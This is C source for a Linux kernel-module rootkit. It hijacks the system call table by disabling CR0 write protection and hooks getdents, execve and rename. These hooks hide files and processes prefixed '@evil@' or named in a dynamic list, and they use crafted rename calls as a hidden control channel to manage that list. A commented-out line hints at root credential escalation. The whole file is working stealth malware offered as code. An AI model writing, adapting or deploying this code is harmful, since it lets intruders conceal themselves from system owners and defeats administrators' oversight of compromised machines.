#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
#include <linux/kallsyms.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/cred.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/err.h>

char** dynamic_processes_to_hide;
int arrayListSize;
int maxArrayListSize;
//Add the process name to the arraylist
//return 0 if successful; -ENOMEM if array failed to be expanded or allocated at startup;
//NOTE THE STRING PASSED INTO THIS MUST BE A STRING COPIED TO THE KERNEL SPACE THROUGH KMALLOC THEN MEMCPY
int addProcessToHide(char* processName){
    if(arrayListSize == -1){
        return -ENOMEM;
    }
    if(arrayListSize >= maxArrayListSize){
        char** tempArray = kcalloc(2*maxArrayListSize,sizeof(char*),GFP_KERNEL);
        if(!tempArray){
            return -ENOMEM;
        }
        memcpy(tempArray,dynamic_processes_to_hide,arrayListSize*sizeof(char*));
        kfree(dynamic_processes_to_hide);
        dynamic_processes_to_hide = tempArray;
        maxArrayListSize = maxArrayListSize*2;
    }
    int i;
    for(i = 0;i < maxArrayListSize;i++){
        if(dynamic_processes_to_hide[i] == NULL){
            dynamic_processes_to_hide[i] = processName;
            arrayListSize++;
            break;
        }
    }
    return 0;
}

//Remove the process name from the arraylist
//return 0 if successful; successful if removed or item does not exist
int deleteProcessToHide(char* processName){
    if(arrayListSize == 0){
        return 0;
    }
    int i;
    for(i = 0;i < maxArrayListSize;i++){
        if(dynamic_processes_to_hide[i] != NULL && strcmp(dynamic_processes_to_hide[i],processName)==0){
            kfree(dynamic_processes_to_hide[i]);
            arrayListSize--;
            dynamic_processes_to_hide[i] = NULL;
        }
    }
    return 0;
}

//return array list size so the user space program can determine the size of the buffer to send
int getArrayListSize(void){
    return arrayListSize;
}

//Fill in the provided buffer with the strings of hidden process names; count is the size of the buffer
//Returns -ENOMEM if buffer does not exist or the buffer cannot fit all entries; 0 otherwise
int getHiddenProcesses(char** buffer,int count){
    if(!buffer || count < arrayListSize){
        return -ENOMEM;
    }
    int i;
    int current_count = 0;
    for(i = 0;i < maxArrayListSize;i++){
        if(dynamic_processes_to_hide[i] != NULL){
            strcpy(buffer[current_count],dynamic_processes_to_hide[i]);
            current_count++;
        }
    }
    return 0;
}


unsigned long  **syscall_table;// = 0xffffffff81a00240;

typedef struct linux_dirent{
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    //char           d_type;    // File type (only since Linux 2.6.4;
    char           d_name[];  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                           offsetof(struct linux_dirent, d_name) */
    /*
    char           pad;       // Zero padding byte*/
                              // offset is (d_reclen - 1))


}linux_dirent;



char* processes_to_hide[] = {"bash"};//array to hold preset processes to hide

asmlinkage int (*original_getdents)(unsigned int,struct linux_dirent*, unsigned int);
asmlinkage int (*original_getdents64)(unsigned int,struct linux_dirent*, unsigned int);//not sure which one of the two constants the kernel uses
asmlinkage int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);
asmlinkage int (*original_rename)(const char *oldpath, const char *newpath);

asmlinkage int new_getdents(unsigned int fd,struct linux_dirent* dirp,
                    unsigned int count){
    int bytesread = original_getdents(fd,dirp,count);
    int newBytes = bytesread;

    struct files_struct *current_files = current->files;// get current proccess file table
    spin_lock(&current_files->file_lock);//hold a lock on current files
    struct file *current_directory = fcheck_files(current_files,fd);//check if the directory passed into getdents exists
    if(current_directory){
        struct path *directory_path = &current_directory->f_path;//get the path structure of the directory
        path_get(directory_path); //increase the reference count so we do not lose this structure randomly
        char* name = (char*)kmalloc(256,GFP_KERNEL);//allocate memory for the directory name
        char* bufferPointer = d_path(directory_path,name,256);
        //printk("%s",bufferPointer);
        path_put(directory_path);//free the reference
        if(strcmp(bufferPointer,"/proc") == 0){//check if we are in /proc and perform hiding of processes
            //printk("Wow! we detected a enter into /proc");
            int psbytes;//this part is the same exact thing as below except now we will grab the director name which
                        //is the pid and then perform a pid lookup to see if its a directory we want to hide
            for(psbytes = 0; psbytes < newBytes;){
                linux_dirent* d = (linux_dirent*) (((void*)(dirp)) + psbytes);
                //printk("%s: bytes long: %d\n",d->d_name,d->d_reclen);
                int pid = 0;
                kstrtoint(d->d_name,10,&pid);
                //printk("%d",pid);
                if(pid != -EINVAL && pid != 0){
                    struct pid *process = find_get_pid(pid);
                    if(process == NULL){
                        psbytes += d->d_reclen;
                        continue;
                    }
                    struct task_struct* process_struct = pid_task(process,PIDTYPE_PID);
                    if(process_struct == NULL){
                        psbytes += d->d_reclen;
                        continue;
                    }
                    //printk("%s",process_struct->comm);
                    char* process_name =  process_struct->comm;

                    bool flag = false;
                    int i;
                    for(i = 0; i < maxArrayListSize; i++){//check if the process is one of the listed override processes
                        if(dynamic_processes_to_hide[i] != NULL && strncmp(process_name,dynamic_processes_to_hide[i],15) == 0){
                            //printk("Match found for process to hide. Hiding from dirent entries.");
                            void* alteredBuffer = (((void*)(dirp)) + psbytes) + d->d_reclen;
                            int removedEntrySize = d->d_reclen;
                            int copySize = newBytes - psbytes - removedEntrySize;
                            memcpy(d,alteredBuffer,copySize);
                            newBytes -= removedEntrySize;
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        continue;
                    }
                    if(strlen(process_name) < 6){//check if the name can even fit the prefix
                        psbytes += d->d_reclen;
                        continue;
                    }
                    if(strncmp(process_name,"@evil@",6)==0){//check if the process name has the prefix
                        //printk("Match found for process to hide. Hiding from dirent entries.");
                        void* alteredBuffer = (((void*)(dirp)) + psbytes) + d->d_reclen;
                        int removedEntrySize = d->d_reclen;
                        int copySize = newBytes - psbytes - removedEntrySize;
                        memcpy(d,alteredBuffer,copySize);
                        newBytes -= removedEntrySize;
                        continue;
                    }
                }

                psbytes += d->d_reclen;
            }
            spin_unlock(&current_files->file_lock);
            kfree(name);
            return newBytes;
        }
        kfree(name);
    }
    spin_unlock(&current_files->file_lock);//release the lock
    //printk("Current fd path:%p\n", current->files->fd_array[fd]->f_path/*.dentry->d_name.name*/);
    /*struct path* inodeInfoBuffer = (struct path*)kcalloc(1,sizeof(struct path),GFP_KERNEL);
    int errormessage = kern_path("/", LOOKUP_FOLLOW, inodeInfoBuffer);
    printk("error: %d",errormessage);
    printk("filesize = %d",inodeInfoBuffer->dentry->d_inode->i_size);   inode information
    printk("mode = %lu",inodeInfoBuffer->dentry->d_inode->i_mode);
    printk("sizeof modefield = %lu",sizeof(umode_t));*/


    //printk("succesfully executed getdents with %d bytes read, filename %s \n",bytesread, dirp->d_name);
    int bytes;
    for(bytes = 0; bytes < newBytes;){
        linux_dirent* d = (linux_dirent*) (((void*)(dirp)) + bytes);
        //printk("%s: bytes long: %d\n",d->d_name,d->d_reclen);
        //printk("inode number: %lu", d->d_ino);
        if(strlen(d->d_name) >= 6){
            if(strncmp(d->d_name,"@evil@",6) == 0){
                //printk("Match found for prefix. Hiding from dirent entries.");
                void* alteredBuffer = (((void*)(dirp)) + bytes) + d->d_reclen;
                int removedEntrySize = d->d_reclen;
                int copySize = newBytes - bytes - removedEntrySize;
                memcpy(d,alteredBuffer,copySize);
                newBytes -= removedEntrySize;
                continue;
            }
        }
        bytes += d->d_reclen;
    }
    //kfree(inodeInfoBuffer);
    //printk("hello world its getdents function");
    return newBytes;
}

asmlinkage int new_execve(const char *pathname, char *const argv[], char *const envp[]){
    //commit_creds(prepare_kernel_cred(0));
    //printk("Program name hooked: %s",pathname);
    return original_execve(pathname,argv,envp);

}

asmlinkage int new_rename(const char* pathname, const char* action){
//    printk("rename called");
    if(pathname == NULL || action == NULL || strlen(pathname) < 6 || strlen(action) < 6){//check if the pathname and action type is long enough for the prefix
        return original_rename(pathname,action);
    }
//    printk("%s",pathname);
//    printk("%s",action);
    if(strncmp(pathname,"@evil@",6) != 0 || strncmp(action,"@evil@",6) != 0){
        return original_rename(pathname,action);
    }
    if(strcmp(action,"@evil@addEntry") == 0){
        char* tempPath = kcalloc(strlen(pathname),1,GFP_KERNEL);
        if(IS_ERR_OR_NULL(tempPath)){
            return -ENOMEM;
        }
        strcpy(tempPath,pathname+6);
  //      printk("%s",tempPath);
        int result = addProcessToHide(tempPath);
        if(result == -ENOMEM)
            return -ENOMEM;
        return 0;
    }
    if(strcmp(action,"@evil@removeEntry")==0){
        char* tempPath = kcalloc(strlen(pathname),1,GFP_KERNEL);
        if(IS_ERR_OR_NULL(tempPath))
            return -ENOMEM;
        strcpy(tempPath,pathname+6);
  //      printk("%s",tempPath);
        int result = deleteProcessToHide(tempPath);
        kfree(tempPath);
        return 0;
    }
    return original_rename(pathname,action);
}

int init_module(){
    write_cr0 (read_cr0 () & (~ 0x10000));//necessary to make the sys_call_table writable
    syscall_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
    printk("loaded syscall table\n");
    original_getdents = (void*)syscall_table[__NR_getdents];//get original function
	original_getdents64 = (void*)syscall_table[__NR_getdents64];
    original_execve = (void*)syscall_table[__NR_execve];
    original_rename = (void*)syscall_table[__NR_rename];
    syscall_table[__NR_getdents64] = (unsigned long*)new_getdents;//replace function
	syscall_table[__NR_getdents] = (unsigned long*)new_getdents;
    syscall_table[__NR_execve] = (unsigned long*)new_execve;
    syscall_table[__NR_rename] = (unsigned long*)new_rename;
	printk("Syscall rename has number: %d",__NR_rename);
    dynamic_processes_to_hide = kcalloc(10,sizeof(char*),GFP_KERNEL);//create the array list;
    if(IS_ERR_OR_NULL(dynamic_processes_to_hide)){
        maxArrayListSize = -1;
        arrayListSize = -1;
    }
    else{
        maxArrayListSize = 10;
        arrayListSize = 0;
    }
    /*char* string = kcalloc(5,1,GFP_KERNEL);
    char* string2 = kcalloc(5,1,GFP_KERNEL);
    strcpy(string,"bash");
    strcpy(string2,"ps");
    addProcessToHide(string);
    addProcessToHide(string2);*/
    //printk("Syscall rename number: %d",maxArrayListSize);
    write_cr0 (read_cr0 () | 0x10000);//necessary to restore syscall table to read only
    return 0;
}

void cleanup_module(){
    write_cr0 (read_cr0 () & (~ 0x10000));
    syscall_table[__NR_getdents64] = ((unsigned long*)original_getdents64);//restore original functions
	syscall_table[__NR_getdents] = ((unsigned long*)original_getdents);
    syscall_table[__NR_execve] = ((unsigned long*)original_execve);
    syscall_table[__NR_rename] = ((unsigned long*)original_rename);
	printk("successfully unloaded kernel module");
    int i;
    for(i = 0; i < maxArrayListSize/sizeof(char*);i++){
        kfree(dynamic_processes_to_hide[i]);
    }
    kfree(dynamic_processes_to_hide);
    write_cr0 (read_cr0 () | 0x10000);
}

MODULE_LICENSE("GPL");

